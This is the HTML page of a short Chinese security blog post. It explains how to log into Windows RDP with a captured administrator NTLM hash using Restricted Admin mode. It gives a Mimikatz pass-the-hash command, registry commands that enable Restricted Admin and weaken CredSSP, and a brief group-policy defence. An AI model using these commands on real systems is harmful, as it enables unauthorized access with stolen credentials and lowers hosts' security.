@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:lzz]">
+<meta name="description" content="注入的哈希用户需要是目标机器的本地管理员
+ 场景 假设抓取到了administrator用户的哈希，想利用该哈希以administrator用户的身份RDP登录主机。
+Server 2012 R2及其以上版本的Windows系统的远程桌面服务支持Restricted Admin mode。也就是使用当前账户的hash凭据来登录远程桌面，无需输入明文密码。
+条件： 1. Win10、server12及以上才可以利用，Win7和Server08默认不支持，需要安装2871997、2973351补丁。 2. 如果用户只在Remote Desktop Users组中是无法连接成功的，因为该机制就是针对受限的管理员模式。 复现 在Windows Server 2012 R2及其以上版本的Windows系统中以管理员权限执行如下命令：
+sekurlsa::pth /user:administrator /domain:192.168.16.62 /ntlm:06d8a9bafc009e178100087bb4e31ada “/run:mstsc.exe /restrictedadmin”
+如果目标机器没有开启Restricted Admin mode可以执行如下命令开启：
+REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+查看是否已开启 DisableRestrictedAdmin
+REG query “HKLM\System\CurrentControlSet\Control\Lsa” | findstr “DisableRestrictedAdmin”
+如果返回 REG_DWORD 0x0 就是开启
+遇到CredSSP加密数据库错误是大概是因为win10家庭版，一条命令直接解决。
+REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
+防御措施 组策略 — 计算机配置 — 管理模板 — 系统 — 凭据分配 — 限制向远程服务器分配凭据，选择已启用" />
+<meta name="keywords" content="homepage, blog, science, informatics, development, programming, tips" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://lzzbb.github.io/posts/2021/06/hash%E7%99%BB%E9%99%86rdp/" />
+
+
+    <title>
+        
+            hash登陆RDP :: lzzzzzzz 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://lzzbb.github.io/main.2461b42f711aae674dd78e353275891fa072d7bf2ea9fbd577297a99dde78461.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://lzzbb.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://lzzbb.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://lzzbb.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://lzzbb.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://lzzbb.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://lzzbb.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="hash登陆RDP">
+<meta itemprop="description" content="注入的哈希用户需要是目标机器的本地管理员
+ 场景 假设抓取到了administrator用户的哈希，想利用该哈希以administrator用户的身份RDP登录主机。
+Server 2012 R2及其以上版本的Windows系统的远程桌面服务支持Restricted Admin mode。也就是使用当前账户的hash凭据来登录远程桌面，无需输入明文密码。
+条件： 1. Win10、server12及以上才可以利用，Win7和Server08默认不支持，需要安装2871997、2973351补丁。 2. 如果用户只在Remote Desktop Users组中是无法连接成功的，因为该机制就是针对受限的管理员模式。 复现 在Windows Server 2012 R2及其以上版本的Windows系统中以管理员权限执行如下命令：
+sekurlsa::pth /user:administrator /domain:192.168.16.62 /ntlm:06d8a9bafc009e178100087bb4e31ada “/run:mstsc.exe /restrictedadmin”
+如果目标机器没有开启Restricted Admin mode可以执行如下命令开启：
+REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+查看是否已开启 DisableRestrictedAdmin
+REG query “HKLM\System\CurrentControlSet\Control\Lsa” | findstr “DisableRestrictedAdmin”
+如果返回 REG_DWORD 0x0 就是开启
+遇到CredSSP加密数据库错误是大概是因为win10家庭版，一条命令直接解决。
+REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
+防御措施 组策略 — 计算机配置 — 管理模板 — 系统 — 凭据分配 — 限制向远程服务器分配凭据，选择已启用"><meta itemprop="datePublished" content="2021-06-17T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-06-17T00:00:00+00:00" />
+<meta itemprop="wordCount" content="74"><meta itemprop="image" content="https://lzzbb.github.io/"/>
+<meta itemprop="keywords" content="tips," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lzzbb.github.io/"/>
+
+<meta name="twitter:title" content="hash登陆RDP"/>
+<meta name="twitter:description" content="注入的哈希用户需要是目标机器的本地管理员
+ 场景 假设抓取到了administrator用户的哈希，想利用该哈希以administrator用户的身份RDP登录主机。
+Server 2012 R2及其以上版本的Windows系统的远程桌面服务支持Restricted Admin mode。也就是使用当前账户的hash凭据来登录远程桌面，无需输入明文密码。
+条件： 1. Win10、server12及以上才可以利用，Win7和Server08默认不支持，需要安装2871997、2973351补丁。 2. 如果用户只在Remote Desktop Users组中是无法连接成功的，因为该机制就是针对受限的管理员模式。 复现 在Windows Server 2012 R2及其以上版本的Windows系统中以管理员权限执行如下命令：
+sekurlsa::pth /user:administrator /domain:192.168.16.62 /ntlm:06d8a9bafc009e178100087bb4e31ada “/run:mstsc.exe /restrictedadmin”
+如果目标机器没有开启Restricted Admin mode可以执行如下命令开启：
+REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+查看是否已开启 DisableRestrictedAdmin
+REG query “HKLM\System\CurrentControlSet\Control\Lsa” | findstr “DisableRestrictedAdmin”
+如果返回 REG_DWORD 0x0 就是开启
+遇到CredSSP加密数据库错误是大概是因为win10家庭版，一条命令直接解决。
+REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
+防御措施 组策略 — 计算机配置 — 管理模板 — 系统 — 凭据分配 — 限制向远程服务器分配凭据，选择已启用"/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-06-17 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://lzzbb.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://lzzbb.github.io/posts">Posts</a></li><li><a href="https://lzzbb.github.io/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        One minute
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://lzzbb.github.io/posts/2021/06/hash%E7%99%BB%E9%99%86rdp/">hash登陆RDP</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <blockquote>
+<p>注入的哈希用户需要是目标机器的本地管理员</p>
+</blockquote>
+<h2 id="场景">场景</h2>
+<p>假设抓取到了administrator用户的哈希，想利用该哈希以administrator用户的身份RDP登录主机。</p>
+<p>Server 2012 R2及其以上版本的Windows系统的远程桌面服务支持Restricted Admin mode。也就是使用当前账户的hash凭据来登录远程桌面，无需输入明文密码。</p>
+<h3 id="条件">条件：</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. Win10、server12及以上才可以利用，Win7和Server08默认不支持，需要安装2871997、2973351补丁。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2. 如果用户只在Remote Desktop Users组中是无法连接成功的，因为该机制就是针对受限的管理员模式。
+</span></span></code></pre></div><h3 id="复现">复现</h3>
+<p>在Windows Server 2012 R2及其以上版本的Windows系统中以管理员权限执行如下命令：</p>
+<p><code>sekurlsa::pth /user:administrator /domain:192.168.16.62 /ntlm:06d8a9bafc009e178100087bb4e31ada “/run:mstsc.exe /restrictedadmin”</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/hash-rdp/1.jpg" alt=""></p>
+<p>如果目标机器没有开启Restricted Admin mode可以执行如下命令开启：</p>
+<p><code>REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</code></p>
+<p>查看是否已开启 DisableRestrictedAdmin</p>
+<p><code>REG query “HKLM\System\CurrentControlSet\Control\Lsa” | findstr “DisableRestrictedAdmin”</code></p>
+<p>如果返回 REG_DWORD 0x0 就是开启</p>
+<p>遇到CredSSP加密数据库错误是大概是因为win10家庭版，一条命令直接解决。</p>
+<p><code>REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f</code></p>
+<h3 id="防御措施">防御措施</h3>
+<p>组策略 — 计算机配置 — 管理模板 — 系统 — 凭据分配 — 限制向远程服务器分配凭据，选择已启用</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/hash-rdp/2.png" alt=""></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://lzzbb.github.io/tags/tips/">tips</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        74 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-06-17 08:00 &#43;0800
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://lzzbb.github.io/posts/2021/08/dcshadow/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">DCShadow</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://lzzbb.github.io/posts/2021/06/wdigest/">
+                    <span class="button__text">wdigest</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://lzzbb.github.io/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js" integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l&#43;qxcnN3UWK6NyURtxH&#43;ovdgjyFuaKZ7si1g=="></script>
+
+
+
+    </body>
+</html>
